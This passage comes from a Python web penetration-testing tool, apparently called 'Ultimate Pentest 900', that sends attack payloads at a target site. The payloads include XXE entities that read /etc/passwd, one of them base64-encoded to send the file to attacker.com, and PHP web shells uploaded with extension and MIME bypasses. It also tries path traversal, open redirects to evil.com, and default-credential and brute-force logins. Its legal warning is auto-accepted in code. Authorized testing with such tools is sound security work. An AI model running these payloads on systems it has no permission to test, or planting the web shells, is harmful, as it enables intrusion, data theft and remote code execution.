            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "data://text/plain;base64,PCFFTlRJVFkgJSB4eGUgU1lTVEVNICJmaWxlOi8vL2V0Yy9wYXNzd2QiPiA8IUVOVElUWSAlIHBhcmFtIFNZU1RFTSAiaHR0cDovL2F0dGFja2VyLmNvbS94eGU/ZmlsZT0mdmFyOyI+IDxwYXJhbTsmcGFyYW07">%xxe;]><foo/>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xxe;</foo>'
        ]
        
        headers = {'Content-Type': 'application/xml'}
        
        for payload in xxe_payloads[:10]:
            try:
                response = self.send_request('POST', f"{self.target}/api/xml", data=payload, headers=headers)
                if response and self.detect_xxe(response, payload):
                    self.log_vulnerability(
                        'XXE',
                        'XML Injection',
                        'CRITICAL',
                        'XXE payload executed'
                    )
            except:
                continue
    
    def detect_xxe(self, response: requests.Response, payload: str) -> bool:
        """Detect XXE in response"""
        if not response:
            return False
        
        xxe_indicators = [
            'root:x:0:0:root',
            '/bin/bash',
            '127.0.0.1',
            'localhost',
            'win.ini',
            '[extensions]',
            'for 16-bit app support'
        ]
        
        response_text = response.text
        for indicator in xxe_indicators:
            if indicator in response_text:
                return True
        
        return False
    
    # ============================================================
    # SECURITY HEADERS TESTS (50 tests)
    # ============================================================
    def test_security_headers(self):
        """Test for security headers"""
        self.print_colored("\n[*] Running Security Headers Tests...", CYAN)
        
        try:
            response = self.send_request('GET', self.target)
            if not response:
                self.print_colored("[!] Could not connect to target", RED)
                return
            
            headers = response.headers
            
            # HSTS Tests
            if 'Strict-Transport-Security' not in headers:
                self.log_vulnerability('Security Headers', 'HSTS', 'MEDIUM', 'HSTS header missing')
            else:
                hsts = headers['Strict-Transport-Security']
                if 'max-age=0' in hsts:
                    self.log_vulnerability('Security Headers', 'HSTS', 'HIGH', 'HSTS max-age set to 0')
                elif 'max-age=' in hsts:
                    max_age = int(re.search(r'max-age=(\d+)', hsts).group(1))
                    if max_age < 31536000:
                        self.log_vulnerability('Security Headers', 'HSTS', 'LOW', f'HSTS max-age too short: {max_age}')
                if 'includeSubDomains' not in hsts:
                    self.log_vulnerability('Security Headers', 'HSTS', 'LOW', 'HSTS missing includeSubDomains')
            
            # CSP Tests
            if 'Content-Security-Policy' not in headers:
                self.log_vulnerability('Security Headers', 'CSP', 'HIGH', 'CSP header missing')
            else:
                csp = headers['Content-Security-Policy']
                dangerous_csp = [
                    'unsafe-inline',
                    'unsafe-eval',
                    '*',
                    'data:',
                    'blob:'
                ]
                for directive in dangerous_csp:
                    if directive in csp:
                        self.log_vulnerability('Security Headers', 'CSP', 'MEDIUM', f'CSP contains {directive}')
            
            # X-Frame-Options Tests
            if 'X-Frame-Options' not in headers:
                self.log_vulnerability('Security Headers', 'X-Frame-Options', 'MEDIUM', 'X-Frame-Options missing')
            else:
                xfo = headers['X-Frame-Options']
                if xfo.upper() not in ['DENY', 'SAMEORIGIN']:
                    self.log_vulnerability('Security Headers', 'X-Frame-Options', 'LOW', f'Weak X-Frame-Options: {xfo}')
            
            # X-XSS-Protection Tests
            if 'X-XSS-Protection' not in headers:
                self.log_vulnerability('Security Headers', 'X-XSS-Protection', 'LOW', 'X-XSS-Protection missing')
            else:
                xssp = headers['X-XSS-Protection']
                if '0' in xssp:
                    self.log_vulnerability('Security Headers', 'X-XSS-Protection', 'MEDIUM', 'X-XSS-Protection disabled')
            
            # X-Content-Type-Options
            if 'X-Content-Type-Options' not in headers:
                self.log_vulnerability('Security Headers', 'X-Content-Type', 'LOW', 'X-Content-Type-Options missing')
            elif headers['X-Content-Type-Options'].lower() != 'nosniff':
                self.log_vulnerability('Security Headers', 'X-Content-Type', 'MEDIUM', 'X-Content-Type-Options not set to nosniff')
            
            # Referrer-Policy
            if 'Referrer-Policy' not in headers:
                self.log_vulnerability('Security Headers', 'Referrer-Policy', 'LOW', 'Referrer-Policy missing')
            
            # Permissions-Policy
            if 'Permissions-Policy' not in headers:
                self.log_vulnerability('Security Headers', 'Permissions-Policy', 'LOW', 'Permissions-Policy missing')
            
            # CORS Tests
            if 'Access-Control-Allow-Origin' in headers:
                acao = headers['Access-Control-Allow-Origin']
                if acao == '*':
                    self.log_vulnerability('Security Headers', 'CORS', 'HIGH', 'CORS allows all origins')
                elif acao == 'null':
                    self.log_vulnerability('Security Headers', 'CORS', 'MEDIUM', 'CORS allows null origin')
            
            # Cookie Security
            if 'Set-Cookie' in headers:
                cookies = response.headers.get_all('Set-Cookie') if hasattr(response.headers, 'get_all') else [headers.get('Set-Cookie', '')]
                for cookie in cookies:
                    if 'Secure' not in cookie:
                        self.log_vulnerability('Security Headers', 'Cookie Security', 'MEDIUM', 'Cookie missing Secure flag')
                    if 'HttpOnly' not in cookie:
                        self.log_vulnerability('Security Headers', 'Cookie Security', 'MEDIUM', 'Cookie missing HttpOnly flag')
                    if 'SameSite' not in cookie:
                        self.log_vulnerability('Security Headers', 'Cookie Security', 'LOW', 'Cookie missing SameSite attribute')
        except Exception as e:
            self.print_colored(f"[!] Error testing headers: {e}", RED)
    
    # ============================================================
    # API TESTS (100 tests)
    # ============================================================
    def test_api(self):
        """Run API tests"""
        self.print_colored("\n[*] Running API Tests...", CYAN)
        
        api_endpoints = [
            '/api',
            '/api/v1',
            '/api/v2',
            '/graphql',
            '/rest',
            '/swagger',
            '/openapi.json',
            '/api-docs',
            '/api/users',
            '/api/admin',
            '/api/login',
            '/api/register',
            '/api/products',
            '/api/orders',
            '/api/settings'
        ]
        
        # Rate Limiting Tests
        for endpoint in api_endpoints[:10]:
            test_url = f"{self.target}{endpoint}"
            success_count = 0
            
            for i in range(20):
                response = self.send_request('GET', test_url)
                if response and response.status_code == 200:
                    success_count += 1
                if i < 19:
                    time.sleep(0.01)  # Minimal delay
            
            if success_count == 20:
                self.log_vulnerability(
                    'API',
                    f'Rate Limiting - {endpoint}',
                    'HIGH',
                    'No rate limiting detected'
                )
        
        # Authentication Tests
        for endpoint in api_endpoints[:10]:
            test_url = f"{self.target}{endpoint}"
            
            # Test without authentication
            response = self.send_request('GET', test_url)
            if response and response.status_code == 200:
                if 'error' not in response.text.lower() and 'unauthorized' not in response.text.lower():
                    self.log_vulnerability(
                        'API',
                        f'Auth - {endpoint}',
                        'CRITICAL',
                        'Endpoint accessible without authentication'
                    )
            
            # Test with weak token
            weak_tokens = ['Bearer test', 'Bearer admin', 'Basic YWRtaW46YWRtaW4=']
            for token in weak_tokens:
                response = self.send_request('GET', test_url, headers={'Authorization': token})
                if response and response.status_code == 200:
                    self.log_vulnerability(
                        'API',
                        f'Auth - {endpoint}',
                        'HIGH',
                        f'Weak token accepted: {token}'
                    )
        
        # IDOR Tests
        for endpoint in ['/api/users/', '/api/profile/', '/api/account/']:
            for user_id in range(1, 20):
                test_url = f"{self.target}{endpoint}{user_id}"
                response = self.send_request('GET', test_url)
                if response and response.status_code == 200:
                    if 'id' in response.text or 'user' in response.text.lower():
                        self.log_vulnerability(
                            'API',
                            f'IDOR - {endpoint}{user_id}',
                            'CRITICAL',
                            'Insecure Direct Object Reference'
                        )
        
        # Mass Assignment Tests
        mass_assignment_payloads = [
            {'username': 'test', 'password': 'test', 'role': 'admin'},
            {'name': 'test', 'email': 'test@test.com', 'is_admin': True},
            {'user': 'test', 'admin': True, 'superuser': True},
            {'username': 'test', 'isAdmin': True}
        ]
        
        for endpoint in ['/api/users', '/api/user/create', '/api/register']:
            for payload in mass_assignment_payloads:
                test_url = f"{self.target}{endpoint}"
                response = self.send_request('POST', test_url, json=payload)
                if response and response.status_code in [200, 201]:
                    self.log_vulnerability(
                        'API',
                        'Mass Assignment',
                        'CRITICAL',
                        f'Endpoint: {endpoint}, Payload: {json.dumps(payload)}'
                    )
        
        # GraphQL Tests
        graphql_endpoints = ['/graphql', '/api/graphql', '/gql']
        for endpoint in graphql_endpoints:
            test_url = f"{self.target}{endpoint}"
            
            # Introspection query
            introspection_query = '{"query":"{__schema{types{name,fields{name}}}}"}'
            response = self.send_request('POST', test_url, data=introspection_query, 
                                        headers={'Content-Type': 'application/json'})
            if response and '__schema' in response.text:
                self.log_vulnerability(
                    'API',
                    f'GraphQL - {endpoint}',
                    'HIGH',
                    'GraphQL introspection enabled'
                )
        
        # REST API Tests
        rest_methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE']
        for endpoint in api_endpoints[:5]:
            for method in rest_methods:
                test_url = f"{self.target}{endpoint}"
                response = self.send_request(method, test_url)
                if response and response.status_code == 200:
                    if method in ['PUT', 'DELETE', 'PATCH']:
                        self.log_vulnerability(
                            'API',
                            f'REST - {method} {endpoint}',
                            'MEDIUM',
                            f'Dangerous HTTP method allowed: {method}'
                        )
    
    # ============================================================
    # AUTHENTICATION TESTS (80 tests)
    # ============================================================
    def test_authentication(self):
        """Run authentication tests"""
        self.print_colored("\n[*] Running Authentication Tests...", CYAN)
        
        login_url = f"{self.target}/login"
        
        # Password Policy Tests
        weak_passwords = [
            'password', 'password123', '123456', 'admin', 'letmein',
            'qwerty', 'monkey', 'dragon', 'master', '12345678',
            '111111', 'password1', 'qwerty123', 'trustno1', 'iloveyou',
            'sunshine', 'princess', 'welcome', 'football', 'shadow'
        ]
        
        for password in weak_passwords[:10]:
            response = self.send_request('POST', login_url, data={'username': 'admin', 'password': password})
            if response and 'locked' not in response.text.lower():
                self.log_vulnerability(
                    'Authentication',
                    'Password Policy',
                    'MEDIUM',
                    f'Weak password not rejected: {password}'
                )
        
        # Brute Force Protection Tests
        for i in range(20):
            response = self.send_request('POST', login_url, data={
                'username': f'test{i}', 'password': 'wrongpassword'
            })
            
            if response and '429' in str(response.status_code):
                break
            if response and 'locked' in response.text.lower():
                break
            
            if i == 19:
                self.log_vulnerability(
                    'Authentication',
                    'Brute Force',
                    'CRITICAL',
                    'No brute force protection detected'
                )
        
        # Session Security Tests
        response = self.send_request('GET', self.target)
        if response and 'Set-Cookie' in response.headers:
            cookies = response.headers.get('Set-Cookie', '')
            
            # Check session cookie attributes
            session_checks = [
                ('Secure', 'MEDIUM'),
                ('HttpOnly', 'HIGH'),
                ('SameSite', 'LOW')
            ]
            
            for check, severity in session_checks:
                if check not in cookies:
                    self.log_vulnerability(
                        'Authentication',
                        f'Session Security - {check}',
                        severity,
                        f'Session cookie missing {check} flag'
                    )
        
        # Password Reset Tests
        reset_urls = ['/forgot-password', '/reset', '/recover', '/password-reset']
        for reset_url in reset_urls:
            test_url = f"{self.target}{reset_url}"
            response = self.send_request('GET', test_url)
            if response and response.status_code == 200:
                # Test for user enumeration
                response1 = self.send_request('POST', test_url, data={'email': 'admin@test.com'})
                response2 = self.send_request('POST', test_url, data={'email': 'nonexistent@test.com'})
                
                if response1 and response2:
                    if len(response1.text) != len(response2.text):
                        self.log_vulnerability(
                            'Authentication',
                            'Password Reset',
                            'HIGH',
                            'User enumeration via password reset'
                        )
        
        # Account Lockout Tests
        for i in range(15):
            response = self.send_request('POST', login_url, data={
                'username': 'admin', 'password': 'wrongpassword'
            })
            if response and ('locked' in response.text.lower() or response.status_code == 429):
                self.log_vulnerability(
                    'Authentication',
                    'Account Lockout',
                    'INFO',
                    f'Account locked after {i+1} attempts'
                )
                break
    
    # ============================================================
    # FILE UPLOAD TESTS (60 tests)
    # ============================================================
    def test_file_upload(self):
        """Run file upload tests"""
        self.print_colored("\n[*] Running File Upload Tests...", CYAN)
        
        upload_urls = [
            '/upload', '/uploads', '/file/upload', '/api/upload',
            '/admin/upload', '/images/upload', '/media/upload'
        ]
        
        # Malicious file types
        malicious_files = [
            ('test.php', '<?php system($_GET["cmd"]); ?>'),
            ('test.php5', '<?php system($_GET["cmd"]); ?>'),
            ('test.phtml', '<?php system($_GET["cmd"]); ?>'),
            ('test.php.jpg', '<?php system($_GET["cmd"]); ?>'),
            ('test.jpg.php', '<?php system($_GET["cmd"]); ?>'),
            ('test.php%00.jpg', '<?php system($_GET["cmd"]); ?>'),
            ('test.asp', '<% Response.Write("test") %>'),
            ('test.aspx', '<%@ Page Language="C#" %>'),
            ('test.jsp', '<% out.println("test"); %>'),
            ('test.config', '<?xml version="1.0"?>'),
            ('test.htaccess', 'AddType application/x-httpd-php .jpg'),
            ('test.svg', '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'),
            ('test.html', '<script>alert(1)</script>'),
            ('test.htm', '<script>alert(1)</script>'),
            ('test.shtml', '<!--#exec cmd="id"-->')
        ]
        
        for upload_url in upload_urls[:5]:
            test_url = f"{self.target}{upload_url}"
            
            for filename, content in malicious_files[:10]:
                files = {'file': (filename, content, 'application/octet-stream')}
                try:
                    response = self.send_request('POST', test_url, files=files)
                    if response and response.status_code == 200:
                        if 'success' in response.text.lower():
                            self.log_vulnerability(
                                'File Upload',
                                filename,
                                'CRITICAL',
                                f'Malicious file upload accepted at {upload_url}'
                            )
                except:
                    continue
            
            # MIME type spoofing
            files = {'file': ('test.php', '<?php system($_GET["cmd"]); ?>', 'image/jpeg')}
            try:
                response = self.send_request('POST', test_url, files=files)
                if response and response.status_code == 200:
                    if 'success' in response.text.lower():
                        self.log_vulnerability(
                            'File Upload',
                            'MIME Spoofing',
                            'CRITICAL',
                            f'MIME type validation bypassed at {upload_url}'
                        )
            except:
                continue
            
            # Double extension
            files = {'file': ('test.jpg.php', '<?php system($_GET["cmd"]); ?>', 'image/jpeg')}
            try:
                response = self.send_request('POST', test_url, files=files)
                if response and response.status_code == 200:
                    if 'success' in response.text.lower():
                        self.log_vulnerability(
                            'File Upload',
                            'Double Extension',
                            'CRITICAL',
                            f'Double extension bypass at {upload_url}'
                        )
            except:
                continue
    
    # ============================================================
    # INFORMATION DISCLOSURE TESTS (60 tests)
    # ============================================================
    def test_information_disclosure(self):
        """Run information disclosure tests"""
        self.print_colored("\n[*] Running Information Disclosure Tests...", CYAN)
        
        # Robots.txt
        robots_urls = ['/robots.txt', '/Robots.txt', '/ROBOTS.TXT']
        for url in robots_urls:
            response = self.send_request('GET', f"{self.target}{url}")
            if response and response.status_code == 200:
                content = response.text
                sensitive_paths = ['admin', 'backup', 'config', 'db', 'password', 'secret', 'private']
                for path in sensitive_paths:
                    if path in content.lower():
                        self.log_vulnerability(
                            'Information Disclosure',
                            'robots.txt',
                            'HIGH',
                            f'Sensitive path disclosed: {path}'
                        )
        
        # Sitemap.xml
        sitemap_urls = ['/sitemap.xml', '/sitemap_index.xml', '/sitemap.xml.gz']
        for url in sitemap_urls:
            response = self.send_request('GET', f"{self.target}{url}")
            if response and response.status_code == 200:
                content = response.text
                if 'admin' in content.lower() or 'private' in content.lower():
                    self.log_vulnerability(
                        'Information Disclosure',
                        'sitemap.xml',
                        'MEDIUM',
                        'Sensitive URLs in sitemap'
                    )
        
        # Backup files
        backup_extensions = ['.bak', '.backup', '.old', '.orig', '.save', '.swp', '~', '.tar', '.gz', '.zip']
        common_files = ['index', 'config', 'database', 'wp-config', 'web.config', '.htaccess', 'app']
        
        for file in common_files:
            for ext in backup_extensions[:5]:
                response = self.send_request('GET', f"{self.target}/{file}{ext}")
                if response and response.status_code == 200:
                    self.log_vulnerability(
                        'Information Disclosure',
                        f'{file}{ext}',
                        'CRITICAL',
                        'Backup file exposed'
                    )
        
        # Git exposure
        git_urls = ['/.git/HEAD', '/.git/config', '/.git/index', '/.git/COMMIT_EDITMSG']
        for url in git_urls:
            response = self.send_request('GET', f"{self.target}{url}")
            if response and response.status_code == 200:
                self.log_vulnerability(
                    'Information Disclosure',
                    url,
                    'CRITICAL',
                    'Git repository exposed'
                )
        
        # .env files
        env_urls = ['/.env', '/.env.backup', '/.env.example', '/.env.local', '/.env.production']
        for url in env_urls:
            response = self.send_request('GET', f"{self.target}{url}")
            if response and response.status_code == 200:
                if 'DB_' in response.text or 'SECRET' in response.text or 'KEY' in response.text:
                    self.log_vulnerability(
                        'Information Disclosure',
                        url,
                        'CRITICAL',
                        'Environment file with secrets exposed'
                    )
        
        # Debug mode
        debug_urls = [
            '/debug', '/debug/default', '/?debug=1', '/?debug=true',
            '/?XDEBUG_SESSION_START=phpstorm', '/?display_errors=1'
        ]
        for url in debug_urls:
            test_url = f"{self.target}{url}"
            response = self.send_request('GET', test_url)
            if response and ('trace' in response.text.lower() or 'debug' in response.text.lower()):
                self.log_vulnerability(
                    'Information Disclosure',
                    'Debug Mode',
                    'HIGH',
                    f'Debug mode enabled: {url}'
                )
    
    # ============================================================
    # ADVANCED TESTS (100 tests)
    # ============================================================
    def test_advanced(self):
        """Run advanced tests"""
        self.print_colored("\n[*] Running Advanced Tests...", CYAN)
        
        # Path Traversal
        self.test_path_traversal()
        
        # Open Redirect
        self.test_open_redirect()
        
        # Host Header Injection
        self.test_host_header_injection()
        
        # Method Tampering
        self.test_method_tampering()
        
        # Directory Listing
        self.test_directory_listing()
        
        # Default Credentials
        self.test_default_credentials()
        
        # Clickjacking
        self.test_clickjacking()
        
        # HTML Injection
        self.test_html_injection()
    
    def test_path_traversal(self):
        """Test for path traversal vulnerabilities"""
        path_traversal_payloads = [
            '../../../etc/passwd',
            '../../../../etc/passwd',
            '../../../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '....//....//....//etc/passwd',
            '..%2f..%2f..%2fetc/passwd',
            '..%252f..%252f..%252fetc/passwd',
            '/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            'file:///etc/passwd',
            'php://filter/convert.base64-encode/resource=index.php',
            'php://filter/read=convert.base64-encode/resource=index.php',
            '....//....//....//....//etc/passwd',
            '..;/..;/..;/etc/passwd',
            '/..%5c..%5c..%5cwindows/win.ini',
            '..%c0%af..%c0%af..%c0%afetc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
            '....//....//....//....//....//etc/passwd',
            '..\\/..\\/..\\/etc/passwd',
            '/var/www/../../etc/passwd',
            '../../../../../../../../etc/passwd'
        ]
        
        params = ['file', 'path', 'page', 'include', 'dir', 'document', 'folder', 'root', 'show', 'source', 'template']
        
        for param in params:
            for payload in path_traversal_payloads[:10]:
                test_url = f"{self.target}?{param}={urllib.parse.quote(payload)}"
                try:
                    response = self.send_request('GET', test_url)
                    if response and ('root:' in response.text or '[extensions]' in response.text or 'bin/bash' in response.text):
                        self.log_vulnerability(
                            'Path Traversal',
                            param,
                            'CRITICAL',
                            f'Payload: {payload}'
                        )
                except:
                    continue
    
    def test_open_redirect(self):
        """Test for open redirect vulnerabilities"""
        redirect_payloads = [
            '//evil.com',
            '//evil.com/%2F..',
            'https://evil.com',
            '//google.com%40evil.com',
            '//evil.com%2F..',
            'https:evil.com',
            '//evil.com/',
            '///evil.com',
            '//evil.com/%2F',
            'https://evil.com%2F',
            '//www.evil.com',
            '//evil%E3%80%82com',
            '//evil。com',
            '//evil.com/',
            'javascript:alert(1)'
        ]
        
        params = ['redirect', 'url', 'return', 'next', 'goto', 'target', 'redir', 'origin', 'referrer', 'from']
        
        for param in params:
            for payload in redirect_payloads[:10]:
                test_url = f"{self.target}?{param}={urllib.parse.quote(payload)}"
                try:
                    response = self.send_request('GET', test_url, allow_redirects=False)
                    if response and response.status_code in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
                        if 'evil.com' in location:
                            self.log_vulnerability(
                                'Open Redirect',
                                param,
                                'HIGH',
                                f'Redirect to: {location}'
                            )
                except:
                    continue
    
    def test_host_header_injection(self):
        """Test for host header injection"""
        host_payloads = [
            'evil.com',
            '127.0.0.1',
            'localhost',
            'evil.com:443',
            'evil.com%00.target.com',
            'evil.com%23.target.com',
            'evil.com%3F.target.com',
            'evil.com%2F.target.com',
            'www.evil.com',
            'evil.com#target.com',
            'evil.com?target.com',
            'target.com@evil.com',
            'target.com\@evil.com',
            'target.com\evil.com',
            'X-Forwarded-Host: evil.com'
        ]
        
        for payload in host_payloads:
            headers = {'Host': payload}
            try:
                response = self.send_request('GET', self.target, headers=headers)
                if response and 'evil.com' in response.text:
                    self.log_vulnerability(
                        'Host Header Injection',
                        'Host',
                        'HIGH',
                        f'Host: {payload} reflected in response'
                    )
            except:
                continue
    
    def test_method_tampering(self):
        """Test for HTTP method tampering"""
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT']
        override_headers = [
            {'X-HTTP-Method-Override': 'PUT'},
            {'X-HTTP-Method': 'PUT'},
            {'X-Method-Override': 'PUT'},
            {'_method': 'PUT'}
        ]
        
        # Test dangerous methods
        for method in methods:
            response = self.send_request(method, self.target)
            if response and method in ['PUT', 'DELETE', 'TRACE']:
                if response.status_code != 405:
                    self.log_vulnerability(
                        'Method Tampering',
                        method,
                        'MEDIUM',
                        f'Dangerous method {method} allowed'
                    )
        
        # Test method override
        for headers in override_headers:
            response = self.send_request('POST', self.target, headers=headers)
            if response and response.status_code != 405:
                self.log_vulnerability(
                    'Method Tampering',
                    'Method Override',
                    'HIGH',
                    f'Method override accepted: {headers}'
                )
    
    def test_directory_listing(self):
        """Test for directory listing"""
        dir_paths = [
            '/admin/', '/backup/', '/uploads/', '/images/', '/css/',
            '/js/', '/logs/', '/config/', '/includes/', '/tmp/',
            '/test/', '/dev/', '/old/', '/assets/', '/static/'
        ]
        
        for path in dir_paths:
            test_url = f"{self.target}{path}"
            response = self.send_request('GET', test_url)
            if response and response.status_code == 200:
                indicators = ['Index of', 'Parent Directory', 'Directory Listing', 'Last modified']
                for indicator in indicators:
                    if indicator.lower() in response.text.lower():
                        self.log_vulnerability(
                            'Directory Listing',
                            path,
                            'MEDIUM',
                            'Directory listing enabled'
                        )
                        break
    
    def test_default_credentials(self):
        """Test for default credentials"""
        default_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', 'admin123'),
            ('admin', '123456'),
            ('root', 'root'),
            ('root', 'password'),
            ('administrator', 'password'),
            ('user', 'user'),
            ('guest', 'guest'),
            ('test', 'test')
        ]
        
        login_urls = ['/login', '/admin', '/admin/login', '/signin', '/auth/login']
        
        for login_url in login_urls:
            test_url = f"{self.target}{login_url}"
            for username, password in default_creds:
                response = self.send_request('POST', test_url, data={
                    'username': username,
                    'password': password
                })
                if response and response.status_code == 200:
                    if 'login' not in response.url.lower() and 'error' not in response.text.lower():
                        self.log_vulnerability(
                            'Default Credentials',
                            f'{username}:{password}',
                            'CRITICAL',
                            f'Default credentials work at {login_url}'
                        )
    
    def test_clickjacking(self):
        """Test for clickjacking vulnerability"""
        response = self.send_request('GET', self.target)
        if response:
            x_frame = response.headers.get('X-Frame-Options', '')
            csp = response.headers.get('Content-Security-Policy', '')
            
            if not x_frame and 'frame-ancestors' not in csp:
                self.log_vulnerability(
                    'Clickjacking',
                    'Missing Headers',
                    'MEDIUM',
                    'No clickjacking protection'
                )
    
    def test_html_injection(self):
        """Test for HTML injection"""
        html_payloads = [
            '<h1>Test</h1>',
            '<b>Bold</b>',
            '<i>Italic</i>',
            '<marquee>Test</marquee>',
            '<blink>Test</blink>',
            '<iframe src="http://evil.com"></iframe>',
            '<form><input type="text"></form>',
            '<a href="http://evil.com">Click</a>',
            '<img src="x" onerror="alert(1)">',
            '<div style="color:red">Test</div>'
        ]
        
        params = ['q', 'search', 'name', 'email', 'comment', 'message', 'title', 'content']
        
        for param in params:
            for payload in html_payloads[:5]:
                test_url = f"{self.target}?{param}={urllib.parse.quote(payload)}"
                response = self.send_request('GET', test_url)
                if response and payload in response.text:
                    self.log_vulnerability(
                        'HTML Injection',
                        param,
                        'MEDIUM',
                        f'HTML injection via {param}: {payload[:30]}'
                    )
    
    # ============================================================
    # REPORTING
    # ============================================================
    def generate_summary(self):
        """Generate test summary"""
        self.print_colored("\n" + "=" * 80, GREEN + BRIGHT)
        self.print_colored(
            self.translate("SCAN SUMMARY", "خلاصه اسکن"),
            GREEN + BRIGHT
        )
        self.print_colored("=" * 80, GREEN + BRIGHT)
        
        execution_time = self.end_time - self.start_time
        tests_per_second = self.test_count / execution_time if execution_time > 0 else 0
        
        # Calculate security score
        score = max(0, 100 - (self.vuln_count * 2))
        
        # Determine risk level
        if score >= 90:
            risk = self.translate("SECURE", "امن")
            risk_color = GREEN
        elif score >= 70:
            risk = self.translate("LOW", "پایین")
            risk_color = GREEN
        elif score >= 50:
            risk = self.translate("MEDIUM", "متوسط")
            risk_color = YELLOW
        elif score >= 30:
            risk = self.translate("HIGH", "بالا")
            risk_color = RED
        else:
            risk = self.translate("CRITICAL", "بحرانی")
            risk_color = RED + BRIGHT
        
        summary = f"""
{self.translate("Total Tests:", "مجموع تست‌ها:")} {self.test_count}
{self.translate("Vulnerabilities Found:", "آسیب‌پذیری‌های پیدا شده:")} {self.vuln_count}
{self.translate("Security Score:", "نمره امنیتی:")} {score}/100
{self.translate("Execution Time:", "زمان اجرا:")} {execution_time:.2f}s
{self.translate("Test Speed:", "سرعت تست:")} {tests_per_second:.2f} tests/s
{self.translate("Risk Level:", "سطح ریسک:")} {risk}
"""
        
        self.print_colored(summary, WHITE + BRIGHT)
        
        # Display vulnerability breakdown
        if self.vulnerabilities:
            self.print_colored("\n" + "=" * 80, RED + BRIGHT)
            self.print_colored(
                self.translate("VULNERABILITIES FOUND", "آسیب‌پذیری‌های کشف شده"),
                RED + BRIGHT
            )
            self.print_colored("=" * 80, RED + BRIGHT)
            
            severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3, 'INFO': 4}
            sorted_vulns = sorted(self.vulnerabilities, key=lambda x: severity_order.get(x['severity'], 5))
            
            for vuln in sorted_vulns[:50]:  # Show first 50
                severity_color = RED + BRIGHT if vuln['severity'] == 'CRITICAL' else \
                                RED if vuln['severity'] == 'HIGH' else \
                                YELLOW if vuln['severity'] == 'MEDIUM' else CYAN
                
                self.print_colored(
                    f"[{vuln['id']}] {vuln['severity']:8} | {vuln['category']:20} | {vuln['test']:30} | {vuln['details'][:50]}",
                    severity_color
                )
        
        # Save reports
        self.save_reports()
    
    def save_reports(self):
        """Save reports in multiple formats"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename_base = f"pentest_report_{timestamp}"
        
        # Save JSON
        json_report = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'execution_time': self.end_time - self.start_time,
            'total_tests': self.test_count,
            'vulnerabilities_found': self.vuln_count,
            'vulnerabilities': self.vulnerabilities
        }
        
        with open(f"{filename_base}.json", 'w') as f:
            json.dump(json_report, f, indent=2)
        
        # Save CSV
        with open(f"{filename_base}.csv", 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['ID', 'Category', 'Test', 'Severity', 'Details', 'Timestamp'])
            for vuln in self.vulnerabilities:
                writer.writerow([
                    vuln['id'], vuln['category'], vuln['test'],
                    vuln['severity'], vuln['details'], vuln['timestamp']
                ])
        
        # Save HTML
        html_report = self.generate_html_report()
        with open(f"{filename_base}.html", 'w') as f:
            f.write(html_report)
        
        self.print_colored(f"\n[*] Reports saved: {filename_base}.json, {filename_base}.csv, {filename_base}.html", GREEN)
    
    def generate_html_report(self) -> str:
        """Generate HTML report"""
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Penetration Test Report - {self.target}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .header {{ background: #2c3e50; color: white; padding: 20px; }}
        .vuln {{ margin: 10px 0; padding: 10px; border-left: 4px solid; }}
        .CRITICAL {{ border-color: #e74c3c; background: #fadbd8; }}
        .HIGH {{ border-color: #e67e22; background: #fdebd0; }}
        .MEDIUM {{ border-color: #f1c40f; background: #fef9e7; }}
        .LOW {{ border-color: #3498db; background: #d6eaf8; }}
        .INFO {{ border-color: #95a5a6; background: #ecf0f1; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>Penetration Test Report</h1>
        <p>Target: {self.target}</p>
        <p>Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p>Total Tests: {self.test_count}</p>
        <p>Vulnerabilities: {self.vuln_count}</p>
    </div>
    <h2>Vulnerabilities</h2>
"""
        for vuln in self.vulnerabilities:
            html += f"""
    <div class="vuln {vuln['severity']}">
        <strong>[{vuln['severity']}] {vuln['category']} - {vuln['test']}</strong>
        <p>{vuln['details']}</p>
        <small>{vuln['timestamp']}</small>
    </div>"""
        
        html += "</body></html>"
        return html


class UltimatePentest900:
    """Main application class"""
    
    def __init__(self):
        self.target = None
        self.language = "en"
        self.mode = "normal"
        self.tester = None
        
    def show_banner(self):
        """Show application banner"""
        banner = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                         ⚡ ULTIMATE PENTEST 900 ⚡                            ║
║                  Advanced Web Penetration Testing Framework                  ║
║                       900+ Security Tests | Python 3.11+                     ║
╚══════════════════════════════════════════════════════════════════════════════╝
        """
        print(GREEN + BRIGHT + banner + Style.RESET_ALL)
    
    def show_legal_warning(self):
        """Show legal warning"""
        warning = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                            ⚠ LEGAL WARNING ⚠                                ║
║                                                                              ║
║  This tool is for AUTHORIZED testing only!                                   ║
║  Only use on systems you own or have written permission to test.             ║
║  Unauthorized testing is ILLEGAL and punishable by law.                      ║
║  You are responsible for all actions taken with this tool.                   ║
║                                                                              ║
║  By continuing, you agree to use this tool ethically and legally.            ║
╚══════════════════════════════════════════════════════════════════════════════╝
        """
        print(RED + BRIGHT + warning + Style.RESET_ALL)
        
        # Auto-accept for demo
        return True
    
    def select_language(self):
        """Select language"""
        print("\n" + CYAN + "Select Language / انتخاب زبان:" + Style.RESET_ALL)
        print("1. English")
        print("2. فارسی (Farsi)")
        
        choice = input("> ").strip()
        if choice == "2":
            self.language = "fa"
        else:
            self.language = "en"
    
